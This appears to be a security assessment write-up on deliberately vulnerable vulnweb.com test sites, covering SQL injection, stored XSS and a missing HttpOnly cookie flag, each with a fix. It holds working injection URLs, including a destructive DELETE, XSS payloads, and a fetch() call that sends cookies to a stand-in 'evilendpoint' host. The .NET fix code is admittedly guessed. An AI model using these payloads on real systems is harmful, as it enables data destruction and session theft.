## SQL injections

### Site: 
http://testaspnet.vulnweb.com/Comments.aspx?id=1
<br>
<br>

### Problem:
The automatic analysis tools indicated that an SQL injection is possible at the parameter id.
SQL injections may grant us access to data we are not supposed to see or even alter them on the database.
<br>
<br>

### Exploit example (Inferential SQL injection): 
In this case we can exploit the comments table of the http://testaspnet.vulnweb.com/ database with an Inferential SQL injection

1. Table guessing: <br>
since we don't know the names of the table on the remote database we can use a query like: http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1=(SELECT+COUNT(*)+FROM+comments) his query will cause ether an error or return a result depending on wether or not the table users exists this way we figured out that the table with the name comments exists on the database 

2. Table manipulation: <br>
at this part I tried to drop or truncate the table which didn't work but the following delete query was successful and all comments on the server where deleted http://testaspnet.vulnweb.com/Comments.aspx?id=0;+DELETE+FROM+comments+WHERE+1=1
<br>
<br>

### Fix: 
To avoid SQL Injections use parameterized queries with bind variables.

since we are dealing with .NET It should be like this (there is a bit of guessing because I don't know the actual query and never wrote .NET)

``` java
public DataSet GetDataSetFromAdapter( 
  DataSet dataSet, string connectionString, integer id)
{
  using (OleDbConnection connection = 
  new OleDbConnection(connectionString))
  {
      // The important part is that we define the id 
      // with ? and then use OleDbType.Integer as a type
      // so all other imput will be result in an error
      queryString = "SELECT * FROM comments WHERE id = ?"
      OleDbDataAdapter adapter = 
      new OleDbDataAdapter(queryString, connection);

      adapter.SelectCommand.Parameters.Add("@id", OleDbType.Integer).Value = id;

      try
      {
          connection.Open();
          adapter.Fill(dataSet);
      }
      catch (Exception ex)
      {
          Console.WriteLine(ex.Message);
      }
  }
  return dataSet;
} 
```
<br>
<br>

### Secound SQL injection (error based): 
The following example is an error based SQL injecton on the site http://testphp.vulnweb.com 
<br>
<br>

### Exploit example: 
1. http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+testtable) 

``` 
Error: Table 'acuart.testtable' doesn't exist Warning: mysql_fetch_array()
expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
```
<br>
<br>

2. http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+products)
```
no error means the table exists
```
<br>
<br>

3. http://testphp.vulnweb.com/listproducts.php?cat=1;+DELETE+FROM+cat+WHERE+id=1

```
Error: You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for 
the right syntax to use near 'DELETE FROM cat WHERE id=1 --' at line 1 Warning: mysql_fetch_array() 
expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
```
<br>
<br>

### Conclusion: 
already we get a lot of information about the server structure like the path /hj/var/www/listproducts.ph. This information can be used for other attacks like Path Traversal on http://testphp.vulnweb.com/showimage.php?file=/hj/var/www/listproducts.php
<br>
<br>

### Fix:
The fix works the same way but this time we will use php 

``` php
$stmt = $dbConnection->prepare('SELECT * FROM products WHERE id = ?');
$stmt->bind_param('i', $id); // 'i' specifies the variable type => 'integer'
$stmt->execute();

$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // Do something with $row
}
```
<br>
<br>
<br>

## XSS cross site scripting


### Site:
http://testaspnet.vulnweb.com/Comments.aspx?id=0
<br>
<br>

### Problem:
The comment section allowes a Stored XSS (AKA Persistent or Type II attack). This securety breach allow mallicios code to be stored permanently on the website. 
<br>
<br>

### Exployed example:
We simply add some JS code in the comment this code will run on all clients who read the comments. A good example is a loggin popup like follows

``` javascript
<script>
  let p = prompt("Enter password:", "");
  alert("TODO send password:" + p + "' to evil endpoint");
</script>
```
or thrugh the html rendering

``` html
<button onclick="console.log('do something evil')">
  Please hack me
</button>
```
<br>
<br>

### Fix:
The first approach is to set the Content Security Policy (CSP) which is an added layer of security that helps to detect and mitigate XSS attacs. A valid policy to only allow same origin would be:

``` 
Content-Security-Policy: default-src 'self'
```

There are several ways to compromise the CSP so it't is necessary to 
sanitize the data on the server wich would look like:

1. The site http://testaspnet.vulnweb.com semes to use .net so the sanitizing will be some like 
``` java
String Data = AntiXss.HtmlEncode(Request.QueryString["Data"]);
```

2. For a node aplication you could install the sanitizer module 
``` javascript
// npm install sanitize or yarn add sanitizer 

let sanitizer = require('sanitize')();
let data = sanitizer.value(req.data, 'string');
```
<br>
<br>

### Notes: 

Since the Stored XSS have the highest harm potential I used it as an example. But you can find reflected XSS (AKA Non-Persistent or Type I) vulnarabilitys too.
<br>
<br>

### Example: 

http://testphp.vulnweb.com/comment.php?aid=1 in the artist name 
http://testphp.vulnweb.com/search.php in the search field 
<br>
<br>

### Fix:
The fix is similar to the first example
<br>
<br>
<br>
<br>

## HTTP Only Cookie

### Site: 
http://testhtml5.vulnweb.com/#/popular
<br>
<br>
### Problem:
After the login action the system will set the usernam cookie, this cookie omits the HTTPOnlyCookie flag. If the HttpOnlyCookie is not set javascript will have access to this cookie 


### Exployed example:
If the website has other flaws like possible XSS weeknesses the hacker could run malicious code on the client. The code can access the cooke and send the information to a malicious endpoint

``` javascript
const cookie = document.cookie;

fetch('https://evilendpoint/cookiespy', {
  method: 'POST',
  headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
  },
  // in our case only the username 
  // cookie which will be "username=admin"
  body: JSON.stringify({ "cookie": cookie })
})
.then(() => console.log('YOU HAVE BEEN HACKED'))
```
<br>
<br>

### Fix:
If you dont't want JS to access a cookie, set the HTTPOnlyCookie flag like follow:
``` java
// HTTP response header Set-Cookie should look like follow 
Set-Cookie: username=<cookie-value>; HttpOnly
```






